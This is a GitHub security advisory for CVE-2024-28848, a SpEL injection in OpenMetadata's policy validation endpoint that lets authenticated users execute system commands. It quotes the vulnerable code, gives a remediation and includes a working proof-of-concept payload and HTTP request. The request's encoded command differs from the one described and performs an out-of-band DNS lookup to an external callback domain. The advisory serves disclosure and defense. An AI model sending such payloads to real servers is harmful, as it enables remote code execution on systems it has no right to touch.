# OpenMetadata vulnerable to a SpEL Injection in `GET /api/v1/policies/validation/condition/<expr>` (`GHSL-2023-236`)

**GHSA**: GHSA-5xv3-fm7g-865r | **CVE**: CVE-2024-28848 | **Severity**: high (CVSS 8.8)

**CWE**: CWE-94

**Affected Packages**:
- **org.open-metadata:openmetadata-service** (maven): < 1.2.4

## Description

### SpEL Injection in `GET /api/v1/policies/validation/condition/<expr>` (`GHSL-2023-236`)

***Please note, only authenticated users have access to PUT / POST APIS for /api/v1/policies. Non authenticated users will not be able to access these APIs to exploit the vulnerability. A user must exist in OpenMetadata and have authenticated themselves to exploit this vulnerability.***

The [`‎CompiledRule::validateExpression`](https://github.com/open-metadata/OpenMetadata/blob/main/openmetadata-service/src/main/java/org/openmetadata/service/security/policyevaluator/CompiledRule.java#L51) method evaluates an SpEL expression using an [`StandardEvaluationContext`](https://github.com/open-metadata/OpenMetadata/blob/main/openmetadata-service/src/main/java/org/openmetadata/service/security/policyevaluator/CompiledRule.java#L57), allowing the expression to reach and interact with Java classes such as `java.lang.Runtime`, leading to Remote Code Execution. The `/api/v1/policies/validation/condition/<expression>` endpoint passes user-controlled data `CompiledRule::validateExpession` allowing authenticated (non-admin) users to execute arbitrary system commands on the underlaying operating system.

[Snippet from PolicyResource.java](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/policies/PolicyResource.java#L448)

```java
  @GET
  @Path("/validation/condition/{expression}")
  @Operation(
      operationId = "validateCondition",
      summary = "Validate a given condition",
      description = "Validate a given condition expression used in authoring rules.",
      responses = {
        @ApiResponse(responseCode = "204", description = "No value is returned"),
        @ApiResponse(responseCode = "400", description = "Invalid expression")
      })
  public void validateCondition(
      @Context UriInfo uriInfo,
      @Context SecurityContext securityContext,
      @Parameter(description = "Expression of validating rule", schema = @Schema(type = "string"))
          @PathParam("expression")
          String expression) {
    CompiledRule.validateExpression(expression, Boolean.class);
  }
```

```java
  public static <T> void validateExpression(String condition, Class<T> clz) {
    if (condition == null) {
      return;
    }
    Expression expression = parseExpression(condition);
    RuleEvaluator ruleEvaluator = new RuleEvaluator();
    StandardEvaluationContext evaluationContext = new StandardEvaluationContext(ruleEvaluator);
    try {
      expression.getValue(evaluationContext, clz);
    } catch (Exception exception) {
      // Remove unnecessary class details in the exception message
      String message = exception.getMessage().replaceAll("on type .*$", "").replaceAll("on object .*$", "");
      throw new IllegalArgumentException(CatalogExceptionMessage.failedToEvaluate(message));
    }
  }
```

In addition, there is a missing authorization check since `Authorizer.authorize()` is never called in the affected path and therefore any authenticated non-admin user is able to trigger this endpoint and evaluate arbitrary SpEL expressions leading to arbitrary command execution.

This vulnerability was discovered with the help of CodeQL's [Expression language injection (Spring)](https://codeql.github.com/codeql-query-help/java/java-spel-expression-injection/) query.
#### Proof of concept

- Prepare the payload
	- Encode `touch /tmp/pwned` in Base64 => `dG91Y2ggL3RtcC9wd25lZA==`
	- SpEL expression to run system command: `T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode("dG91Y2ggL3RtcC9wd25lZA==")))`
	- Encode the payload using URL encoding:
```
%54%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%54%28%6a%61%76%61%2e%75%74%69%6c%2e%42%61%73%65%36%34%29%2e%67%65%74%44%65%63%6f%64%65%72%28%29%2e%64%65%63%6f%64%65%28%22%64%47%39%31%59%32%67%67%4c%33%52%74%63%43%39%77%64%32%35%6c%5a%41%3d%3d%22%29%29%29
```

- Send the payload using a valid JWT token:
```http
GET /api/v1/policies/validation/condition/%54%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%54%28%6a%61%76%61%2e%75%74%69%6c%2e%42%61%73%65%36%34%29%2e%67%65%74%44%65%63%6f%64%65%72%28%29%2e%64%65%63%6f%64%65%28%22%62%6e%4e%73%62%32%39%72%64%58%41%67%61%58%70%73%4e%7a%45%33%62%33%42%69%62%57%52%79%5a%57%46%6f%61%33%4a%6f%63%44%4e%72%63%32%70%72%61%47%4a%75%4d%6d%4a%7a%65%6d%67%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%3d%22%29%29%29 HTTP/2
Host: sandbox.open-metadata.org
Authorization: Bearer <non-admin JWT>
```
- Verify that a file called `/tmp/pwned` was created in the OpenMetadata server
#### Impact

This issue may lead to Remote Code Execution by a registered and authenticated user.

#### Remediation

Use [`SimpleEvaluationContext`](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html) to exclude *references to Java types, constructors, and bean references*.
